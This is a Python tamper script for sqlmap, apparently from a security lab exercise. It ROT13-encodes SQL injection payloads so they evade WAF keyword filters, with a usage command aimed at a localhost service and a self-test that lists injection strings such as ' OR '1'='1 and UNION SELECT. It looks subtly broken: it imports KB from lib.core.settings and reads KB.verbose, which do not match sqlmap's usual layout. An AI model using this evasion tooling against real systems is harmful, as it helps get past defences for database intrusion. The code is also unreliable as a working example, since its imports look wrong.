#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Task 3: ROT13 Tamper Script for SQLMap
Custom tamper module to encode payloads using ROT13

SQLMap will automatically use this to encode the injection payload before sending it.
This is useful for bypassing basic WAF rules that look for SQL keywords.

Usage:
    sqlmap -u "http://localhost:8003/?search=1" --tamper=rot13_tamper -p search

Author: Security Lab
Modified by: Exploit Developer
"""

from lib.core.settings import KB
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    """
    Check if tamper script has required dependencies
    """
    pass

def rot13(text):
    """
    Encode/decode string using ROT13
    
    Args:
        text: Input string
    
    Returns:
        ROT13 encoded/decoded string
    """
    result = []
    for char in text:
        if 'a' <= char <= 'z':
            result.append(chr((ord(char) - ord('a') + 13) % 26 + ord('a')))
        elif 'A' <= char <= 'Z':
            result.append(chr((ord(char) - ord('A') + 13) % 26 + ord('A')))
        else:
            result.append(char)
    return ''.join(result)

def tamper(payload, **kwargs):
    """
    Tamper function for SQLMap
    
    This function is called by SQLMap for each payload.
    It applies ROT13 encoding to the payload.
    
    Args:
        payload: Original SQL injection payload
        **kwargs: Additional arguments from SQLMap
    
    Returns:
        Encoded payload
    
    Example:
        Input:  " OR 1=1-- -"
        Output: " BE 1=1-- -"  (ROT13 encoded)
    """
    
    if payload:
        # Encode the entire payload using ROT13
        encoded_payload = rot13(payload)
        
        # Log information (for debugging)
        if KB.verbose > 1:
            print("[*] Original: %s" % payload)
            print("[*] ROT13:    %s" % encoded_payload)
        
        return encoded_payload
    
    return payload


# Test the tamper script
if __name__ == '__main__':
    test_payloads = [
        "1",
        "1 OR 1=1",
        "1' OR '1'='1",
        "1 UNION SELECT 1,2,3,4",
        "1 AND 1=1",
        "SELECT * FROM users WHERE id=1"
    ]
    
    print("=" * 70)
    print("ROT13 Tamper Script Test")
    print("=" * 70)
    
    for payload in test_payloads:
        encoded = rot13(payload)
        decoded = rot13(encoded)  # ROT13 twice = original
        
        print("\nOriginal: %s" % payload)
        print("Encoded:  %s" % encoded)
        print("Decoded:  %s" % decoded)
        print("Match:    %s" % (payload == decoded))
